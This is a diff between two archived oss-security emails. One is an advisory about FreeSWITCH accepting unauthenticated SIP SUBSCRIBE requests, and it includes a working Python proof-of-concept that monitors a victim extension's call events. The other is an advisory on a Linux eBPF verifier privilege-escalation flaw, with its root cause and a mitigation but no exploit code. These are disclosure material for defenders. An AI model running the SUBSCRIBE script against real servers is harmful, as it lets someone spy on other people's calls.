@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5283" "Monday" "25" "October" "2021" "16:24:09" "+0200" "Sandro Gauci" "sandro@enablesecurity.com" nil "107" "[oss-security] [ES2021-08] FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default" nil nil nil "10" nil nil (number mark "U       sandro@enabl Oct 25  107/5283  " thread-indent "\"[oss-security] [ES2021-08] FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [ES2021-08] FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1416" "Thursday" "13" "January" "2022" "16:21:09" "+0800" "tr3e wang" "tr3e.wang@gmail.com" nil "47" "[oss-security] Linux Kernel eBPF Improper Input Validation Vulnerability" nil nil nil "1" nil nil (number mark "U       tr3e.wang@gm Jan 13   47/1416  " thread-indent "\"[oss-security] Linux Kernel eBPF Improper Input Validation Vulnerability\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux Kernel eBPF Improper Input Validation Vulnerability" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 3669 invoked by uid 550); 25 Oct 2021 14:37:53 -0000
+Received: (qmail 3408 invoked by uid 550); 13 Jan 2022 10:04:05 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,158 +12,85 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 29813 invoked from network); 25 Oct 2021 14:24:41 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
-	enablesecurity.com; h=mime-version:message-id:date:from:to
-	:subject:content-type; s=fm1; bh=Tu6X49NmM1ZvjrYe9WQvo7AIhMK9R9Q
-	pEHZnZp57QAc=; b=Asy/1dgpFoLJKlN1Goc+rDvmWdmBs1t/pvXxbQCTpd5Ooxm
-	Da279eHsbONYnhv73jAvRBXobNWvlMyoUfIgQTnOQs1lU6A7kAijUhUiSnaClg27
-	zwEuIUrLmXrY0YR93gG18+UPjJqOJ1XWsGmWYjjS1ajYEJBt/MPKPTlCV9OnhKJF
-	69K/P6CssLJLpPGvOmiScPuzXRuIf97E6SSccBeWJmTsVpQhObf3zDC19UfCdmXl
-	5HnC/vQnaa1vVBZkcxl8H3PKTHVrvhtBX+0/3CMFSVsxI475YrRQj0QKAwbg1dn2
-	PStCGmzwZXCFT0Ib6AX3MNFmm166R1O6APb8IWw==
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
-	messagingengine.com; h=content-type:date:from:message-id
-	:mime-version:subject:to:x-me-proxy:x-me-proxy:x-me-sender
-	:x-me-sender:x-sasl-enc; s=fm1; bh=Tu6X49NmM1ZvjrYe9WQvo7AIhMK9R
-	9QpEHZnZp57QAc=; b=cSAxeyJdVuolEv55i7Qfv7R24SwaTSeHHig5hoFm0atD8
-	+TR5G+tEUih/GBDjBDnN7tOOIUlcXU3PFCA/80bzwUSNXjdbqItJdjD1pu6G1tHG
-	1exeNHjNOil95dciF1GeG0zDcU7JErwS0B+PTSYD5Ty5bGZGKS9hUqPJtbH0K0xq
-	jQ/+25KTWvT9weqsXiatmC9wlHgYEYXEL412L+HDmNv0U4ryODiMyOtYVYT0viG5
-	awMLF4JIf8AM9OV3dkWp5ekMt8d4X3AlSuu5oiefG8KrjyI2JPkNACZ7YLPxvADk
-	FX9F3PmXk+9tph2WNiMbYEQoflPacLV+84iZS+5LQ==
-X-ME-Sender: <xms:Hb52YX5mLOftTEEb3_HNXZo8YeIw3C8km53tNAOxCUmqcM8ywy2jUA>
-    <xme:Hb52Yc7zGlpqrvsbdEbh5lUi87aTqupanUw0NBz6iWj89jJcpJVG0B6rS9Vp5GHl1
-    FH6wbwLWNsg1nuRmQ>
-X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvtddrvdefhedgjeefucetufdoteggodetrfdotf
-    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
-    uceurghilhhouhhtmecufedttdenucenucfjughrpefofgggkfffhffvufgtsehttdertd
-    erredtnecuhfhrohhmpedfufgrnhgurhhoucfirghutghifdcuoehsrghnughrohesvghn
-    rggslhgvshgvtghurhhithihrdgtohhmqeenucggtffrrghtthgvrhhnpeffheeuheefhf
-    etteevffdvgeeitddtgedvvdfgkefffedtjeetvdekleevheegheenucffohhmrghinhep
-    ghhithhhuhgsrdgtohhmpdhmuhhlthhilhhinhgvrdhgrhhouhhppdgvnhgrsghlvghsvg
-    gtuhhrihhthidrtghomhenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmhgr
-    ihhlfhhrohhmpehsrghnughrohesvghnrggslhgvshgvtghurhhithihrdgtohhm
-X-ME-Proxy: <xmx:Hr52Yec6zfFqRVwwwESwVih7vBbZ29zCFayCJOyBUiYcCPas37o7Iw>
-    <xmx:Hr52YYIKJTsaT4wwmB1_Dp4cuL4gbpc34ZxH3m7J8sgEJjUNAFbXbw>
-    <xmx:Hr52YbIJUh4yX96cRyTIDqxcevts2B4X8hPk9VVBG7JdxZhSbZ5LPg>
-    <xmx:Hr52YYFlrko7i6jLHqnIkpBMnMvI2KXDMMN72oifiMDDqTtwdOz-GA>
-X-Mailer: MessagingEngine.com Webmail Interface
-User-Agent: Cyrus-JMAP/3.5.0-alpha0-1369-gd055fb5e7c-fm-20211018.002-gd055fb5e
-Mime-Version: 1.0
-Message-Id: <455d2673-74ca-4d9a-b54e-84af570f2242@www.fastmail.com>
-Date: Mon, 25 Oct 2021 16:24:09 +0200
-From: "Sandro Gauci" <sandro@enablesecurity.com>
-To: oss-security@lists.openwall.com, bugtraq@securityfocus.com,
- fulldisclosure@seclists.org, voipsec@voipsa.org,
- submissions@packetstormsecurity.org, vuln@secunia.com, cert@cert.org
-Content-Type: text/plain
-Subject: [oss-security] [ES2021-08] FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default
+Received: (qmail 29834 invoked from network); 13 Jan 2022 08:21:33 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20210112;
+        h=mime-version:from:date:message-id:subject:to:cc;
+        bh=AF3GBgvm0irr2JUutuvhEcZt2JYHDCHgNKhv7Jvxq3A=;
+        b=RIOT9e5Ox+pS6bqnpHbx4q8Ytcw5a8T4ET3XF8+eFjXDDltnFSCIB8OnseRBilGndz
+         GlaGpU0Sa9vjvvu14EESQ1foVwS+gRrmhguMW+4cMZzSZRKvt36lnZIySYwNva3h+3ku
+         tsSC0QJp50y25PCUxnwyi4iGvgOaWNnQV+thDYzRzrcnlBHJFllsHVScFPb71WqD3cl3
+         DQ2oOK4InQroBlzzRjFRofsMK02ar5NLEcn8VCRMm3EFXFJ69kbckhCOP4RHMMsLsK/N
+         L0e7Po/U64nW0ghLKmObCkWfqSdTHq+K9nsMQLtm/7iSyhgZb7J32RjhoTRDGnNiIQuU
+         MxAA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20210112;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
+        bh=AF3GBgvm0irr2JUutuvhEcZt2JYHDCHgNKhv7Jvxq3A=;
+        b=LI3chwmKMp2tZkzznYtcaULbxajcnIFr9oDgbJTOhP2FXmrShOjSwZkG96V5exzSOZ
+         i4kIYykJRHr3ONmP8JvTk2hwRsb7JbbtDRId5h9cEyfGscUniRdr50MK9Ls074+tCrQc
+         qOfJPXbgagFvtQLcNE7R05KdM0652NOK3jjZiLyfcBlbM2NDOSPYUggEumgy++UKYfHs
+         uPUtWFYSsHs40v9w6CQ4dFjIP+XzKMcLNPsbfTE/hhcM5p+hRLLJtAICJ/pfAcRsp5C/
+         5ZQex7yrXs8/lmnS0CYR+UDqby7uaU8WIGirym9Ra82VkXm3d0cXUptYrOU0ANZDXXWM
+         iblg==
+X-Gm-Message-State: AOAM5309WFDuBAQlE4hHazMuJxwO5Kn5ob6kzkhfuqfeNw6WdHN58+lx
+	AB5UVUHH2kBt3ecJnVgA0IS3iKF5IeYENTsQw2cRwNACIOs=
+X-Google-Smtp-Source: ABdhPJzJ+Sn4DADNFR6FKrrWdJtbRBix4wkxLFAPQsbtA4PemQJoVr8LtnY3Br94NT8ZLMt590XO9DcCTb7wExJebu8=
+X-Received: by 2002:a05:6830:2645:: with SMTP id f5mr2396972otu.19.1642062080597;
+ Thu, 13 Jan 2022 00:21:20 -0800 (PST)
+MIME-Version: 1.0
+From: tr3e wang <tr3e.wang@gmail.com>
+Date: Thu, 13 Jan 2022 16:21:09 +0800
+Message-ID: <CA+eGCHaJ8Vcgm=+KqmFwmLd8BP+Vn8aos6RZzvbzHd544SdQZg@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Cc: Daniel Borkmann <daniel@iogearbox.net>
+Content-Type: multipart/alternative; boundary="0000000000000361af05d5725f84"
+Subject: [oss-security] Linux Kernel eBPF Improper Input Validation Vulnerability
 
-# FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default
+--0000000000000361af05d5725f84
+Content-Type: text/plain; charset="UTF-8"
 
-- Fixed versions: v1.10.7
-- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-08-freeswitch-SIP-SUBSCRIBE-without-auth
-- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-g7xg-7c54-rmpj
-- Other references: CVE-2021-41157
-- Tested vulnerable versions: <= v1.10.5
-- Timeline:
-    - Report date: 2021-06-07
-    - Triaged: 2021-06-08
-    - Fix provided for testing: 2021-10-01
-    - Vendor release with fix: 2021-10-24
-    - Enable Security advisory: 2021-10-25
+Hi all,
 
-## Description
+This vulnerability allows local attackers to escalate privileges on
+affected installations of Linux Kernel. An attacker must first obtain the
+ability to execute low-privileged code on the target system in order to
+exploit this vulnerability.
 
-By default, SIP requests of the type SUBSCRIBE are not authenticated in the affected versions of FreeSWITCH. Although this issue was [fixed][1] in version v1.10.6, installations upgraded to the fixed version of FreeSWITCH from an older version, may still be vulnerable if the configuration is not updated accordingly. For good reason, by default, software upgrades do not update the configuration.
+The specific flaw exists within the handling of eBPF programs. The issue
+results from the lack of proper validation of user-supplied eBPF programs
+prior to executing them. An attacker can leverage this vulnerability to
+escalate privileges and execute code in the context of the kernel.
+BE AWARE, unprivileged bpf is disabled by default in most distros.
 
-[1]: https://github.com/signalwire/freeswitch/commit/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e
+*Affected Version*
 
-## Impact
+    Linux Kernel 5.8 or later
 
-Abuse of this security issue allows attackers to subscribe to user agent event notifications without the need to authenticate. This abuse poses privacy concerns and might lead to social engineering or similar attacks. For example, attackers may be able to monitor the status of target SIP extensions.
+*Root Cause Analysis*
 
-## How to reproduce the issue
+The bpf verifier(kernel/bpf/verifier.c) did not properly restrict several
+*_OR_NULL pointer types which allows these types to do pointer arithmetic.
+This can be leveraged to bypass the verifier check and escalate privilege.
+(see
+https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/bpf/verifier.c?h=v5.10.83#n6022
+)
 
-1. Install FreeSWITCH v1.10.5 or lower
-2. Run FreeSWITCH using the default configuration
-3. Register as a legitimate SIP user on the FreeSWITCH server using a softphone (e.g. sip:1000@192.168.188.128 where 192.168.188.128 is your FreeSWITCH server)
-4. Save the below Python script to `anon-subscribe.py`
-5. Run the script from an IP address that is different from that of the softphone `python anon-subscribe.py <freeswitch_ip> <freeswitch_port> <victim_extension>`
-6. Perform some operations using the softphone, such as deregistering, registering, and placing a call
-7. Observe that several notifications are received by the script, exposing the actions being performed by the victim
+*Exploit Code*
 
-```python
-import socket, string, random, re, sys
+Exploit code will be delayed for 5 days and will be posted at 12:00 UTC,
+Jan 18, 2022
 
-UDP_IP = sys.argv[1]
-UDP_PORT = int(sys.argv[2])
-EXT = sys.argv[3]
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+*Mitigations*
 
-msg_template = "SUBSCRIBE sip:%s@%s;transport=UDP SIP/2.0\r\n" % (EXT, UDP_IP) + \
-    "Via: SIP/2.0/UDP [ip]:[port];rport;branch=z9hG4bK-[rand]\r\n" \
-    "Max-Forwards: 70\r\n" \
-    "Contact: <sip:%s@[ip]:[port];transport=udp>\r\n" % (EXT, ) + \
-    "To: <sip:%s@%s;transport=UDP>\r\n" % (EXT, UDP_IP) + \
-    "From: <sip:9999@%s;transport=UDP>;tag=[rand]\r\n" % (UDP_IP, ) + \
-    "Call-ID: [rand]\r\n" \
-    "CSeq: 1 SUBSCRIBE\r\n" \
-    "Expires: 600\r\n" \
-    "Accept: */*\r\n" \
-    "Event: [event]\r\n" \
-    "Content-Length: 0\r\n" \
-    "\r\n"
+set kernel.unprivileged_bpf_disabled to 1
 
-rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
-msg = msg_template.replace('[ip]', '127.0.0.1') \
-    .replace('[port]', '9999') \
-        .replace('[event]', 'dialog') \
-            .replace('[rand]', rand)
+BE AWARE AGAIN, unprivileged bpf is disabled by default in most distros.
 
-sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))
+*Credits*
 
-recv=sock.recv(10240).decode()
+tr3e of SecCoder Security Lab
+Best,
+tr3e
 
-# get rport and received from Via header
-rport=re.search( r'rport=([0-9]+)', recv, re.MULTILINE).group(1)
-received=re.search( r'received=([0-9\.]+)', recv, re.MULTILINE).group(1)
-
-events = [
-    'talk', 'hold', 'conference', 'presence', 'as-feature-event', 'dialog', 'line-seize', 
-    'call-info', 'sla', 'include-session-description', 'presence.winfo', 'message-summary', 
-    'refer']
-
-for event in events:
-    rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
-    msg = msg_template.replace('[ip]', received) \
-        .replace('[port]', rport) \
-            .replace('[event]', event) \
-                .replace('[rand]', rand)
-    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))
-
-while True:
-    print(sock.recv(10240).decode().split('\r\n\r\n')[1])
-```
-
-## Solution and recommendations
-
-Upgrade to a version of FreeSWITCH that fixes this issue.
-
-Our suggestion to the FreeSWITCH developers was the following:
-
-> Our recommendation is that SIP SUBSCRIBE messages are authenticated by default so that FreeSWITCH administrators do not need to explicitly set the `auth-subscriptions` parameter. When following such a recommendation, a new parameter can be introduced to explicitly disable authentication.
-
-## About Enable Security
-
-[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.
-
-## Disclaimer
-
-The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
-
-## Disclosure policy
-
-This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.
-
+--0000000000000361af05d5725f84--
